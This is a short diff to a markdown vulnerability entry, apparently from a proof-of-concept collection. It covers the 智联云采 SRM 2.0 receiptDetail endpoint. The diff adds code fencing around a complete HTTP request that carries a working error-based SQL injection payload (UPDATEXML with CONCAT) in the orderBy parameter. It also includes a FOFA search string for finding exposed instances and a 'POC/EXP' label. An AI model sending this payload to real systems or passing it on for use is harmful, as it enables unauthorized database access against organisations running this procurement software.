@@ -85,6 +85,7 @@ FOFA：title=="SRM 2.0"
 
 POC/EXP：
 
+```http
 POST /adpweb/api/srm/delivery/receiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
@@ -92,6 +93,8 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 Connection: keep-alive
+```
+
 
 ![image-20241121163847276](./.resource/智联云采SRM2.0receiptDetail处SQL注入漏洞/media/image-20241121163847276.png)
 
